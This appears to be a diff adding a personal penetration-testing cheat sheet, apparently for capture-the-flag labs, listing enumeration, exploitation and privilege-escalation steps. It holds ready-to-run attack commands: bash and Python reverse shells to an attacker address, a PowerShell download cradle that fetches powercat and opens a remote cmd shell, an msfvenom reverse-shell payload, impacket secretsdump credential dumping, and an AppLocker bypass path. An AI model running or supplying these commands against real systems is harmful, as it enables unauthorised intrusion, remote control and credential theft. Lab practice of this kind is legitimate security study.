@@ -1,0 +1,167 @@
+Foothold
+========
+Setup
+set ip to host name in /etc/hosts and check ports again
+Setup up burp to analyse all web requests
+
+Enum
+Scan ports: 1-65535
+Identify services on open ports
+Identify versions of services
+Check web pages
+Get website cert (sslyze)
+Run dirbuster over web endpoints/directories with
+    php,txt,html extensions
+    other extensions
+Try default creds for login pages
+    try metasploit brute forces
+Run nmap scripts
+Use metasploit scripts
+    - Use auxiliary for information gathering
+    - Use exploits to get access
+Run enum4linux for windows machines/domains
+Look for backup files (.bak, .old)
+mix and match usernames and password on each service
+    greenwolf/spray   Username extractor
+    cewl              Dump keywords from website
+Use creds without burp proxy
+    known to block http auth
+check user accounts lastlogon to narrow down list
+Check for home directories in other places
+Try to get access to other accounts
+autorecon --only-scans-dir --single-target -o scans $ip --heartbeat 30
+
+Exploit
+Find exploits:
+    searchsploit
+    Google 
+Try different variants of the same exploit
+Search for vulnerabilities
+check for ssti https://portswigger.net/research/server-side-template-injection?fbclid=IwAR2Tyd_D9U6cYM0DXF8ziH_K0JxB2nkgl5nmN7HDCpCKnkOcBjtFbJJLCFU
+if reverse shells aren't working try
+    common ports
+    bind shell
+    using a really long delay (5min)
+
+ginfo
+notes
+cheat sheets
+
+Google for help woth:
+    enum
+    foothold
+    privesc
+    tools
+
+Services
+========
+AD:
+    kebrute       kerberos brueforcer
+    icebreaker    AD expoloitation
+    impacket      windows exploitation tools
+    rubeus        kerberos exploitation
+
+Smb:
+    smbmap
+    smbclient
+    smbget
+
+web:
+    wpscan
+    burp
+    dirbuster
+    sslyze
+
+ftp:
+    sudo curlftpfs -o allow_other anonymous:anonymous@$ip /mnt/ftp
+    ls -R /mnt/ftpfind / -perm -u=s 2>/dev/null | grep -v snap
+
+Shells
+======
+upgrade to pty      python3 -c 'import pty; pty.spawn("/bin/bash")'
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=$(myip) -f exe -o payload.exe
+check nishang for windows shells
+
+metasploit shell handlers
+    exploit/mutli/handler listens for incomming connections 
+    multi/script/web_delivery listens for incomming connections for executed scripts
+        prints command
+        
+
+Privesc
+============
+Look for locally running services with local ports
+    port forward ports
+Try updating scripts
+Linux
+-----
+                                        sudo -l
+Find files owned by group               find / -group david 2>/dev/null
+Find files owned by user                find / -user Matt 2>/dev/null | grep -v "/proc"
+Find backup files                       find / -name "*.bak*" 2>/dev/null
+FInd suid binaries                      find / -perm -u=s 2>/dev/null | grep -v snap
+Check root processes                    ps -aux | grep root
+                                        ls -la /etc/cron.d
+                                        cat /etc/sudoers
+                                        netstat -tupln
+Check for binaries with non absolute paths
+Check history files
+Run Linpeas.sh/Linenum.sh
+gtfobins
+
+docker
+-----
+is container?            getcap -r / 2>/dev/null
+privileged?              
+
+Windows
+-------
+Get user info                           whoami /all
+                                        impacket-secretsdump target -dc-ip $ip
+Windows-Exploit-Suggester
+                                        systeminfo
+                                        C:/windows/system32/config
+
+Powershell:
+Downloading files  
+    powershell.exe -c Invoke-WebRequest -Uri http://10.10.14.2:8000/PowerUp.ps1 -OutFile powerup.ps1
+
+Run powerup in memory 
+    powershell -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.24:8000/PowerUp.ps1'); Invoke-AllChecks -HTMLReport"
+
+    powershell -exec bypass -Command "& {Import-Module .\PowerUp.ps1;Invoke-AllChecks}"
+    powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.4.47.57:8000/powercat.ps1');powercat -c 10.4.47.57 -p 40045 -e cmd"
+
+powershell history
+%userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+
+applocker
+    bypass by putting files in C:\Windows\System32\spool\drivers\color
+
+Find files
+    get-childitem -path C:\ -filter "*interesting-file.txt*" -r
+
+reverse shells:
+bash -i >& /dev/tcp/ATTACKING-IP/40045 0>&1
+
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKING-IP",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+/usr/share/webshells
+
+meterpreter
+    log powershell "run powershell commands"
+    load incognito - acces to tokens for impersonation
+        list_tokens -g
+
+Stuck
+=====
+1. Do you know what you need to do?
+2. Is there anything weird you haven't considered?
+3. Are there any tools that can help you?
+4. Have you looked for new tools?
+5. Have you googled the text?
+6. Have you looked up a guide for how to do the technqiue?
+7. Have you looked up a similar challenge?
+8. Have you tried the technique locally?
+9. Look for keywords in the manual
+10. Explore what you can with parts of it
